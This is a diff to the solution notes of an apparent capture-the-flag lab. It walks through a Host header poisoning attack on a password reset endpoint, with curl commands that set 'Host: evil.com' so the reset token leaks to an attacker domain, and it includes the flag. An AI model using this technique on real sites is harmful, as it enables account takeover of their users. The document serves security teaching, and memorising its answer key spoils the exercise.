@@ -68,19 +68,32 @@ Flag: FLAG{r3s3t_p01s0n_h0st}
 
   The /reset endpoint generates a password reset link using
   request.host, which can be poisoned via the Host header.
+  The reset link is NOT shown directly in the browser response.
+  Instead, it is "sent via email" (stored server-side).
 
-  Step 1: Request a reset for admin with poisoned Host header:
+  Step 1: Request a reset for admin with a poisoned Host header:
     curl -X POST http://localhost:5005/reset \
-      -H "Host: attacker.com" \
+      -H "Host: evil.com" \
       -d "username=admin"
 
-  Step 2: The response shows the reset link with the attacker's domain.
-  Extract the token from the link.
+    The response only says "Password reset link has been sent to
+    admin@neonauth.local." — the link is NOT visible.
 
-  Step 3: Use the token to access the flag:
+  Step 2: Check the simulated email inbox to see the poisoned link:
+    curl http://localhost:5005/reset/simulate-email
+
+    The "email" will show a reset link like:
+      http://evil.com/reset/confirm?token=<TOKEN>
+
+    In a real attack, this link would be sent to the victim's email.
+    Because the Host header was poisoned, the link points to
+    evil.com — so when the victim clicks it, the token is leaked
+    to the attacker's server.
+
+  Step 3: Extract the token from the link and use it on the real server:
     curl "http://localhost:5005/reset/confirm?token=<TOKEN>"
 
-  The confirmation page displays the flag.
+    The confirmation page displays the flag.
 
 -------------------------------------------------------------------------------
 
